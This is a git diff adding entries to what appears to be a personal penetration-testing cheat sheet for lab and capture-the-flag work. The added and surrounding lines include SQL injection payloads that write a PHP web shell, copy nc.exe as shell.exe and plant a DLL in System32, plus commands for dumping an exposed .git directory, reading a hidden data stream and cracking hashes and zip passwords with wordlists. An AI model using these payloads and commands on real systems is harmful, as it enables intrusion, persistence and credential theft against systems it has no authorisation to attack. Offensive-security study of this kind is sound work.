@@ -13,6 +13,8 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [proof.txt](#proof.txt)
+  - [gitdumper](#gitdumper)
   - [KPCLI && kdbx](#kpcli_&&_kdbx)
   - [whatweb](#whatweb)
   - [ntpdate](#ntpdate)
@@ -378,6 +380,8 @@ update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR
 
 # Upload a php file
 select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile "/srv/http/cmd.php"
+select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
+select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
 
 # Move Files
 select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
@@ -597,6 +601,26 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 ```
 
 ## Tools
+### proof.txt
+```bash
+# When we have a random txt file instead of proof.txt
+PS C:\Users\Administrator\Desktop> Get-Item -path hm.txt -stream *
+
+FileName: C:\Users\Administrator\Desktop\hm.txt
+
+Stream                   Length
+------                   ------
+:$DATA                       36
+root.txt                     34
+
+Get-Content -path hm.txt -stream root.txt
+```
+
+
+### gitdumper
+```bash
+git-dumper http://192.168.234.144:80/.git ./gitdumps 
+```
 
 ### kpcli && kdbx
 ```bash
@@ -987,6 +1011,9 @@ hashcat -m 5600 thecybergeek /usr/share/wordlists/rockyou.txt --force
 **john**
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt offsec.hash
+
+# Display already discovered hash
+john hashname --show
 ```
 
 **ssh2john**
@@ -995,7 +1022,11 @@ $ ssh2john anita_id_rsa > ssh_key
 $ hashcat -m 22911 ./ssh_key /usr/share/wordlists/rockyou.txt --force
 ```
 
-
+**zip2john**
+```bash
+First check manually if it's password protected or not
+zip2john sitebackup3.zip > zip.hash
+```
 
 ### pspy
 ```bash
